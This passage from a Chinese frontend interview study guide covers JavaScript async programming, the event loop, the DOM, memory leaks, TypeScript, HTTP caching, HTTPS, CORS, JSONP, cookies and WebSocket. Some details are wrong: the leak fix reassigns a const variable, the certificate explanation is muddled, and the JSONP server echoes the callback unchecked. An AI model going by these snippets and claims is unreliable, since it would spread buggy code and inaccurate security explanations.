**4. ES6 Class**：

```javascript
class Parent {
  constructor(name) {
    this.name = name;
  }
  
  sayHello() {
    console.log(this.name);
  }
}

class Child extends Parent {
  constructor(name, age) {
    super(name);
    this.age = age;
  }
}
```

### 3.6 异步编程 ⭐⭐⭐ 🔥🔥🔥

**考点**：异步编程的方式

**1. 回调函数**：

```javascript
function fetchData(callback) {
  setTimeout(() => {
    callback('data');
  }, 1000);
}

fetchData((data) => {
  console.log(data);
});
```

**问题**：回调地狱

**2. Promise**：

```javascript
function fetchData() {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      resolve('data');
    }, 1000);
  });
}

fetchData()
  .then(data => console.log(data))
  .catch(error => console.error(error));
```

**3. async/await**：

```javascript
async function getData() {
  try {
    const data = await fetchData();
    console.log(data);
  } catch (error) {
    console.error(error);
  }
}
```

### 3.7 Event Loop ⭐⭐⭐ 🔥🔥🔥

**考点**：事件循环机制

**执行流程**：

```
执行同步代码
    ↓
检查微任务队列
    ↓
执行所有微任务
    ↓
检查宏任务队列
    ↓
执行一个宏任务
    ↓
重复上述过程
```

**宏任务**：
- `setTimeout`
- `setInterval`
- `setImmediate`（Node.js）
- I/O 操作
- UI 渲染

**微任务**：
- `Promise.then`
- `MutationObserver`
- `process.nextTick`（Node.js）

**示例**：

```javascript
console.log('1');

setTimeout(() => {
  console.log('2');
}, 0);

Promise.resolve().then(() => {
  console.log('3');
});

console.log('4');

// 输出：1 4 3 2
```

**执行顺序**：
1. 同步代码：1、4
2. 微任务：3
3. 宏任务：2

### 3.8 DOM 操作 ⭐⭐⭐ 🔥🔥

**考点**：常见的 DOM 操作

#### 3.8.1 创建和插入

```javascript
// 创建元素
const div = document.createElement('div');
const text = document.createTextNode('Hello');
const fragment = document.createDocumentFragment();

// 插入元素
parent.appendChild(child);
parent.insertBefore(newNode, oldNode);
parent.replaceChild(newNode, oldNode);
```

#### 3.8.2 查询元素

```javascript
// 根元素
document.documentElement; // <html>

// ID 查询
document.getElementById('id');

// Class 查询
document.getElementsByClassName('class');

// 标签查询
document.getElementsByTagName('div');

// CSS 选择器
document.querySelector('.class');
document.querySelectorAll('.class');
```

#### 3.8.3 节点关系

```javascript
// 父节点
el.parentNode;
el.parentElement;

// 子节点
el.childNodes;
el.children;
el.firstChild;
el.lastChild;
el.hasChildNodes();

// 兄弟节点
el.previousSibling;
el.previousElementSibling;
el.nextSibling;
el.nextElementSibling;
```

#### 3.8.4 元素尺寸与位置

**offset 族**：

```javascript
// 尺寸（border + padding + content）
el.offsetWidth;
el.offsetHeight;

// 位置（相对于 offsetParent）
el.offsetTop;
el.offsetLeft;

// 获取元素距离文档顶部的距离
function getOffsetTop(el) {
  let offsetTop = el.offsetTop;
  let curEl = el.offsetParent;
  
  while (curEl !== null) {
    offsetTop += curEl.offsetTop;
    curEl = curEl.offsetParent;
  }
  
  return offsetTop;
}
```

**scroll 族**：

```javascript
// 尺寸（包含滚动内容）
el.scrollWidth;
el.scrollHeight;

// 滚动距离
el.scrollTop;
el.scrollLeft;

// 获取文档尺寸
document.documentElement.scrollHeight;

// 获取视口尺寸
document.documentElement.clientHeight;
```

**client 族**：

```javascript
// 尺寸（padding + content）
el.clientWidth;
el.clientHeight;

// 获取视口尺寸
document.documentElement.clientWidth;
document.documentElement.clientHeight;
```

**getBoundingClientRect**：

```javascript
const rect = el.getBoundingClientRect();

// 相对于视口的位置
rect.top;
rect.left;
rect.right;
rect.bottom;

// 尺寸（包含 padding 和 border）
rect.width;
rect.height;
```

**注意**：
- 访问这些属性会触发回流，影响性能
- 应该缓存这些值，避免重复访问

### 3.9 垃圾回收与内存泄漏 ⭐⭐⭐ 🔥🔥🔥

**考点**：垃圾回收机制

#### 3.9.1 垃圾回收方式

**1. 引用计数**：
- 对象有引用时计数 +1
- 引用释放时计数 -1
- 计数为 0 时回收

**问题**：循环引用无法回收

```javascript
function problem() {
  const obj1 = {};
  const obj2 = {};
  
  obj1.ref = obj2;
  obj2.ref = obj1; // 循环引用
}
```

**2. 标记清除**（主流）：
- 从根对象（window）开始标记
- 标记所有可达对象
- 清除未标记的对象

#### 3.9.2 内存泄漏场景

**1. 全局变量**：

```javascript
// ❌ 意外创建全局变量
function foo() {
  bar = 'leak'; // 没有 var/let/const
}

// ✅ 使用严格模式
'use strict';
function foo() {
  bar = 'leak'; // 报错
}
```

**2. 未清除的定时器**：

```javascript
// ❌ 定时器未清除
const timer = setInterval(() => {
  // 引用外部变量
  console.log(data);
}, 1000);

// ✅ 清除定时器
clearInterval(timer);
```

**3. DOM 引用**：

```javascript
// ❌ 保留 DOM 引用
const refA = document.getElementById('refA');
document.body.removeChild(refA); // DOM 删除了
console.log(refA); // 但引用还在

// ✅ 释放引用
refA = null;
```

**4. 闭包**：

```javascript
// ❌ 闭包保留大量数据
function outer() {
  const largeData = new Array(1000000);
  
  return function inner() {
    console.log(largeData.length);
  };
}

// ✅ 只保留必要数据
function outer() {
  const largeData = new Array(1000000);
  const length = largeData.length;
  
  return function inner() {
    console.log(length);
  };
}
```

---

## 四、TypeScript ⭐⭐⭐ 🔥🔥

### 4.1 TypeScript 优点 ⭐⭐⭐ 🔥

**考点**：为什么使用 TypeScript

**优点**：
1. **类型系统**：静态类型检查，减少运行时错误
2. **ES 新特性**：支持最新的 JavaScript 语法
3. **独有特性**：interface、enum、泛型等
4. **配置灵活**：可编译成各种版本的 JavaScript
5. **开发体验**：更好的代码提示和自动补全

### 4.2 基础类型 ⭐⭐⭐ 🔥

#### 4.2.1 any vs unknown ⭐⭐⭐ 🔥🔥

**考点**：两者的区别

**区别**：

```typescript
// any：绕过类型检查
let a: any = 'hello';
a = 123;
a.foo(); // 不报错

let b: string = a; // 可以赋值给任何类型

// unknown：类型安全的 any
let c: unknown = 'hello';
c = 123;
c.foo(); // 报错

let d: string = c; // 报错，不能直接赋值

// 需要类型断言或类型守卫
if (typeof c === 'string') {
  let d: string = c; // 正确
}
```

**使用建议**：
- 优先使用 `unknown` 而不是 `any`
- `unknown` 更安全，需要类型检查后才能使用

#### 4.2.2 void vs never ⭐⭐ 🔥

**考点**：两者的区别

**区别**：

```typescript
// void：无返回值（或返回 undefined）
function log(): void {
  console.log('hello');
}

// never：永远不会返回
function error(): never {
  throw new Error('error');
}

function infiniteLoop(): never {
  while (true) {}
}
```

### 4.3 type vs interface ⭐⭐⭐ 🔥🔥

**考点**：两者的区别和选择

**type 可以而 interface 不行**：

```typescript
// 1. 声明基本类型别名
type Name = string;

// 2. 声明联合类型
type ID = string | number;

// 3. 声明元组
type Point = [number, number];

// 4. 使用 typeof
const obj = { x: 0, y: 0 };
type Obj = typeof obj;
```

**interface 可以而 type 不行**：

```typescript
// 声明合并
interface User {
  name: string;
}

interface User {
  age: number;
}

// 合并后
const user: User = {
  name: 'Alice',
  age: 18
};
```

**使用建议**：
- 定义对象类型：优先使用 `interface`
- 定义联合类型、元组等：使用 `type`
- 需要声明合并：使用 `interface`

### 4.4 常用配置 ⭐⭐ 🔥

**考点**：tsconfig.json 配置

**常用配置**：

```json
{
  "compilerOptions": {
    // 编译目标
    "target": "ES2020",
    
    // 模块系统
    "module": "ESNext",
    "moduleResolution": "node",
    
    // 输出目录
    "outDir": "./dist",
    
    // 是否编译 JS
    "allowJs": true,
    "checkJs": true,
    
    // 是否生成编译文件
    "noEmit": false,
    "noEmitOnError": true,
    
    // 严格模式
    "strict": true,
    "alwaysStrict": true,
    "noImplicitAny": true,
    "noImplicitThis": true,
    "strictNullChecks": true,
    
    // 其他
    "esModuleInterop": true,
    "skipLibCheck": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules"]
}
```

---

## 五、网络协议 ⭐⭐⭐ 🔥🔥🔥

### 5.1 HTTP 基础 ⭐⭐⭐ 🔥🔥

#### 5.1.1 GET vs POST ⭐⭐⭐ 🔥

**考点**：两者的区别

**区别**：

| 特性 | GET | POST |
|------|-----|------|
| **参数位置** | URL 中 | 请求体中 |
| **参数长度** | 有限制（浏览器限制） | 无限制 |
| **安全性** | 参数可见 | 相对安全 |
| **幂等性** | 幂等 | 非幂等 |
| **缓存** | 可缓存 | 不可缓存 |
| **数据类型** | ASCII 字符 | 无限制 |

#### 5.1.2 常见 Content-Type ⭐⭐⭐ 🔥

**考点**：请求体的数据格式

**1. application/x-www-form-urlencoded**：
- 表单默认提交方式
- 格式：`key1=val1&key2=val2`
- key 和 value 都进行 URL 编码

**2. application/json**：
- 最常用
- JSON 格式，适合复杂结构化数据
- RESTful API 常用

**3. multipart/form-data**：
- 文件上传必须使用
- 支持多种数据格式混合

**4. text/xml**：
- XML 格式
- 结构化数据

### 5.2 HTTP 缓存 ⭐⭐⭐ 🔥🔥🔥

**考点**：HTTP 缓存机制

#### 5.2.1 强缓存 ⭐⭐⭐ 🔥🔥

**特点**：不需要向服务器确认，直接使用缓存

**1. Cache-Control**（HTTP/1.1，优先级更高）：

```http
Cache-Control: max-age=31536000
```

**常用指令**：
- `max-age=<seconds>`：缓存时间
- `no-cache`：需要协商缓存
- `no-store`：不缓存
- `public`：可被任何缓存
- `private`：只能被浏览器缓存

**2. Expires**（HTTP/1.0）：

```http
Expires: Wed, 21 Oct 2025 07:28:00 GMT
```

**缺点**：依赖本地时间，可能不准确

**命中强缓存**：返回 200（from cache）

#### 5.2.2 协商缓存 ⭐⭐⭐ 🔥🔥

**特点**：需要向服务器确认资源是否更新

**1. ETag / If-None-Match**（基于内容，优先级更高）：

```http
# 首次请求
Response Headers:
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"

# 再次请求
Request Headers:
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"

# 服务器响应
- 匹配：304 Not Modified
- 不匹配：200 OK + 新资源 + 新 ETag
```

**2. Last-Modified / If-Modified-Since**（基于时间）：

```http
# 首次请求
Response Headers:
Last-Modified: Wed, 21 Oct 2024 07:28:00 GMT

# 再次请求
Request Headers:
If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT

# 服务器响应
- 未修改：304 Not Modified
- 已修改：200 OK + 新资源 + 新 Last-Modified
```

**缺点**：
- 只能精确到秒
- 文件修改但内容未变，也会重新下载

**命中协商缓存**：返回 304

#### 5.2.3 缓存流程 ⭐⭐⭐ 🔥🔥

```
浏览器请求资源
    ↓
检查强缓存（Cache-Control/Expires）
    ├─ 命中 → 直接使用缓存（200 from cache）
    └─ 未命中 ↓
检查协商缓存（ETag/Last-Modified）
    ├─ 304 → 使用缓存
    └─ 200 → 下载新资源
```

### 5.3 HTTPS ⭐⭐⭐ 🔥🔥🔥

**考点**：HTTPS 的工作原理

#### 5.3.1 HTTPS 原理 ⭐⭐⭐ 🔥🔥🔥

**核心流程**：

```
1. 生成对话密钥（非对称加密）
    ↓
客户端：发送随机数 client_num1 + 支持的加密算法
    ↓
服务器：返回随机数 server_num2 + 数字证书（含公钥）
    ↓
客户端：验证证书 → 生成随机数 client_num2 → 用公钥加密 → 发送
    ↓
服务器：用私钥解密 → 得到 client_num2
    ↓
双方：用 3 个随机数生成对话密钥
    ↓
2. 使用对话密钥通信（对称加密）
    ↓
双方：用对话密钥加密/解密数据
```

#### 5.3.2 数字证书 ⭐⭐⭐ 🔥🔥

**作用**：防止中间人攻击

**验证流程**：

```
1. CA 签名生成
    ↓
CA：hash(服务器信息) → 摘要
    ↓
CA：用私钥加密摘要 → 数字签名
    ↓
数字证书 = 签名 + 服务器信息 + CA 公钥
    ↓
2. 客户端验证
    ↓
客户端：用 CA 公钥解密签名 → hash1
    ↓
客户端：hash(服务器信息) → hash2
    ↓
对比：hash1 === hash2 → 证书有效
```

### 5.4 跨域 ⭐⭐⭐ 🔥🔥🔥

**考点**：跨域的原因和解决方案

#### 5.4.1 同源策略 ⭐⭐⭐ 🔥🔥

**定义**：协议、域名、端口必须完全相同

**限制**：
1. 无法读取非同源的 Cookie、LocalStorage
2. 无法操作非同源的 DOM
3. 无法发送非同源的 AJAX 请求

#### 5.4.2 CORS ⭐⭐⭐ 🔥🔥🔥

**服务端设置**：

```javascript
// 允许的源
response.setHeader('Access-Control-Allow-Origin', 'https://example.com');

// 允许的方法
response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');

// 允许的请求头
response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

// 允许携带 Cookie
response.setHeader('Access-Control-Allow-Credentials', 'true');

// 预检请求缓存时间
response.setHeader('Access-Control-Max-Age', '86400');
```

**客户端设置**：

```javascript
// XMLHttpRequest
xhr.withCredentials = true;

// Fetch
fetch(url, {
  credentials: 'include'
});

// Axios
axios.defaults.withCredentials = true;
```

**预检请求**：
- 非简单请求会先发送 OPTIONS 请求
- 服务器返回允许的方法和头部
- 通过后才发送实际请求

#### 5.4.3 其他跨域方案 ⭐⭐ 🔥

**1. JSONP**：

```javascript
// 客户端
function handleCallback(data) {
  console.log(data);
}

const script = document.createElement('script');
script.src = 'http://example.com/api?callback=handleCallback';
document.body.appendChild(script);

// 服务端
const callback = req.query.callback;
res.send(`${callback}(${JSON.stringify(data)})`);
```

**缺点**：
- 只支持 GET 请求
- 容易遭受 XSS 攻击

**2. Nginx 反向代理**：

```nginx
server {
  listen 80;
  server_name example.com;
  
  location /api {
    proxy_pass http://api.example.com;
  }
}
```

**3. postMessage**：

```javascript
// 父窗口
iframe.contentWindow.postMessage('hello', 'http://example.com');

// 子窗口
window.addEventListener('message', (e) => {
  if (e.origin === 'http://parent.com') {
    console.log(e.data);
  }
});
```

### 5.5 Cookie ⭐⭐⭐ 🔥🔥

**考点**：Cookie 的使用和安全

#### 5.5.1 Cookie 属性 ⭐⭐⭐ 🔥

**设置 Cookie**：

```http
Set-Cookie: name=value; expires=Mon, 22-Jan-07 07:10:24 GMT; domain=.example.com; path=/; Secure; HttpOnly; SameSite=Lax
```

**属性说明**：
- **Expires/Max-Age**：过期时间
- **Domain**：生效域名
- **Path**：生效路径
- **Secure**：只在 HTTPS 中传输
- **HttpOnly**：禁止 JavaScript 访问（防 XSS）
- **SameSite**：防止 CSRF 攻击

#### 5.5.2 SameSite ⭐⭐⭐ 🔥🔥

**作用**：防止 CSRF 攻击

**取值**：
- **Strict**：完全禁止第三方 Cookie
- **Lax**：大多数情况禁止，导航 GET 请求除外
- **None**：不限制（需同时设置 Secure）

```http
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=None; Secure
```

### 5.6 WebSocket ⭐⭐⭐ 🔥🔥

**考点**：WebSocket 的特点和使用

**特点**：
- 全双工通信
- 基于 TCP
- 使用 HTTP 握手
- 实时性好

**使用示例**：

```javascript
// 客户端
const ws = new WebSocket('ws://localhost:8080');

ws.onopen = () => {
  console.log('连接成功');
  ws.send('Hello Server');
};

ws.onmessage = (event) => {
  console.log('收到消息:', event.data);
};

ws.onclose = () => {
  console.log('连接关闭');
};

ws.onerror = (error) => {
  console.error('错误:', error);
};

// 服务端（Node.js + ws）
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
  console.log('客户端连接');
  
  ws.on('message', (message) => {
    console.log('收到消息:', message);
    ws.send('Hello Client');
  });
});
```

---

